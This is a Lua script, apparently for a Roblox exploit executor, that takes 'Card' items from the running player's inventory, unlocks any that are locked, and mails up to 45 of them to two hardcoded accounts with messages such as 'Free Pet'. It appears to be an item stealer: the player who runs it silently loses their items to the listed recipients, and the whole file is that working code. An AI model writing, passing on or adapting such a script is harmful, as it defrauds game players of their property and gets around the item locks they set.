local usernamesString = [[
maudimancing1
recyaza
]]
-- Settings for Card items
getgenv().Settings = {
    Items = {
        ["Card"] = {
            Class = "Card",
            -- Pattern to match IDs ending with "Card", optionally followed by spaces and numbers
            pattern = "Card%s*%d*$",
            maxSendPerUser = 45
        }
    }
}

local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Save = require(RS.Library.Client.Save)
local Network = require(RS.Library.Client.Network)

-- Parse the usernames (one per line)

local usernames = {}
for line in usernamesString:gmatch("([^\n]+)") do
    if line ~= "" then
        table.insert(usernames, line)
    end
end

local messages = {"Free Pet", "This What you Get"}

-- Function to refresh and retrieve all available Card items that match the pattern
local function GetCardItems()
    local data = Save.Get()
    local inventory = data and data.Inventory
    local items = {}
    if inventory and inventory[getgenv().Settings.Items["Card"].Class] then
        for uid, itemData in pairs(inventory[getgenv().Settings.Items["Card"].Class]) do
            if itemData.id:match(getgenv().Settings.Items["Card"].pattern) and 
               itemData._am and itemData._am > 0 then
                table.insert(items, {uid = uid, data = itemData})
            end
        end
    end
    return items
end

-- Function to send mail using the Network module
local function sendMail(username, itemType, uid, amount, message)
    local args = {
        username,
        message,
        itemType,
        uid,
        amount
    }
    -- Wait until the server call succeeds
    repeat
        task.wait()
    until Network.Invoke("Mailbox: Send", unpack(args))
    wait(0.5)
end

-- Main loop: For each username, send up to maxSendPerUser card items
for _, username in ipairs(usernames) do
    local countSent = 0
    while countSent < getgenv().Settings.Items["Card"].maxSendPerUser do
        local availableCards = GetCardItems()
        if #availableCards == 0 then
            print("No available Card items left for", username)
            break
        end
        
        -- Pick a random available card from the refreshed inventory
        local chosen = availableCards[math.random(1, #availableCards)]
        local uid = chosen.uid
        local itemData = chosen.data

        -- Unlock the card if it's locked
        if itemData._lk then
            repeat
                task.wait()
            until Network.Invoke("Locking_SetLocked", uid, false)
            print("Unlocked", uid)
        end
        
        local selectedMessage = messages[math.random(1, #messages)]
        sendMail(username, "Card", uid, 1, selectedMessage)
        print("Sent", uid, "to", username, "with message:", selectedMessage)
        
        countSent = countSent + 1
    end
end
